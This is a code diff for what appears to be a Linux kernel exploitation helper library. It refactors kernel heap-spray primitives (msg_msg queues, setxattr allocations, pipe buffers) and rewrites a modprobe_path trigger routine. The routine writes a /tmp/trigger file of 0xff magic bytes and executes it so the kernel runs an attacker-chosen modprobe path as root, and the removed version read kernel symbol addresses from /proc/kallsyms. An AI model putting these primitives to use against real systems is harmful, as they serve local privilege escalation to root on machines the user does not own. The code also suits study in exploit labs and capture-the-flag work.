@@ -124,6 +124,10 @@ void kmalloc1024_pipe_buffer(int pair[2]) {
 
 ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 #ifdef ENABLE_MSG_MSG
+#ifndef __USE_GNU
+#define __USE_GNU
+#endif
+
 #include <sys/ipc.h>
 #include <sys/msg.h>
 #include <sys/types.h>
@@ -240,24 +244,30 @@ struct msgbuf *peek_msgseg(int msgid, size_t size) {
 #include <sys/types.h>
 #include <sys/xattr.h>
 
+#ifndef KMALLOC_SETXATTR_PATH
+#define KMALLOC_SETXATTR_PATH "/tmp/setxattr_%d"
+#endif
+
+#ifndef KMALLOC_SETXATTR_KEY
+#define KMALLOC_SETXATTR_KEY "ceb32713a5d2d2ca"
+#endif
+
 int kmalloc_setxattr_counter = 0;
 
 void kmalloc_setxattr(size_t size, char *buf) {
   char path[PATH_MAX];
-  snprintf(path, PATH_MAX, "/tmp/setxattr_%d", kmalloc_setxattr_counter++);
+  snprintf(path, PATH_MAX, KMALLOC_SETXATTR_PATH, kmalloc_setxattr_counter++);
 
   FILE *fp = fopen(path, "w");
-  if (fp == NULL) {
+  if (!fp) {
     ABORT("fopen");
   }
   fclose(fp);
 
-  char *key = "ceb32713a5d2d2ca";
-  int err = setxattr(path, key, buf, size, XATTR_CREATE);
+  int err = setxattr(path, KMALLOC_SETXATTR_KEY, buf, size, XATTR_CREATE);
   if (err == -1) {
     switch (errno) {
     case EOPNOTSUPP:
-      /* vfs_setxattr may fail. but it's no problem. */
       break;
     default:
       ABORT("setxattr");
@@ -452,33 +462,76 @@ void reenable_userfault(void *addr, size_t length) {
 
 ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 #ifdef ENABLE_MODPROBE_PATH
+#include <errno.h>
 #include <stdio.h>
 #include <stdlib.h>
+#include <sys/stat.h>
+#include <sys/types.h>
+#include <sys/wait.h>
+#include <unistd.h>
 
-void exec_modprobe_path(char *path, char *command) {
-  char buffer[0x200];
-  char *format =
-      "echo ============================;"
-      "echo [DEBUG];"
-      "egrep ' (modprobe_path|call_usermodehelper_setup)$' /proc/kallsyms;"
-      "echo -n '/proc/sys/kernel/modprobe = ';"
-      "cat /proc/sys/kernel/modprobe;"
-      "echo ============================;"
-      "echo -e '#!/bin/sh\\n%2$s' > %1$s;"
-      "chmod +x %1$s;"
-      "echo -e '\\xff\\xff\\xff\\xff' > /tmp/trigger;"
-      "chmod +x /tmp/trigger;"
-      "/tmp/trigger;";
-  snprintf(buffer, sizeof(buffer), format, path, command);
-  system(buffer);
+#define EXEC_MODPROBE_PATH_FILE "/tmp/trigger"
+
+void exec_modprobe_path(char *path) {
+  if (!path) {
+    path = EXEC_MODPROBE_PATH_FILE;
+  }
+
+  FILE *fp = fopen(path, "wb");
+  if (!fp) {
+    ABORT("fopen");
+  }
+
+  char magic[] = {0xff, 0xff, 0xff, 0xff};
+  size_t n = fwrite(magic, 1, 4, fp);
+
+  fclose(fp);
+
+  if (n < 4) {
+    ABORT("fwrite");
+  }
+
+  int err;
+
+  err = chmod(path, S_IXUSR);
+  if (err == -1) {
+    ABORT("chmod");
+  }
+
+  pid_t pid = fork();
+  if (pid == -1) {
+    ABORT("fork");
+  }
+
+  if (!pid) {
+    char *argv[] = {path, NULL};
+    char *envp[] = {NULL};
+    err = execve(path, argv, envp);
+    if (err == -1) {
+      switch (errno) {
+      case ENOEXEC:
+        break;
+      default:
+        ABORT("execve");
+      }
+    }
+
+    exit(EXIT_SUCCESS);
+  }
+
+  int wstatus;
+  err = waitpid(pid, &wstatus, WUNTRACED);
+  if (err == -1) {
+    ABORT("waitpid");
+  }
 }
 
 #endif
 
 ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 #ifdef LOCK_CPU
-#ifndef _GNU_SOURCE
-#define _GNU_SOURCE
+#ifndef __USE_GNU
+#define __USE_GNU
 #endif
 
 #include <sched.h>
@@ -511,7 +564,7 @@ void set_comm(char *name) {
 #ifdef ENABLE_DUMP
 #include <stdio.h>
 
-void wait() { getchar(); }
+void stop() { getchar(); }
 
 void dump(unsigned char *p, size_t len) {
   size_t i;
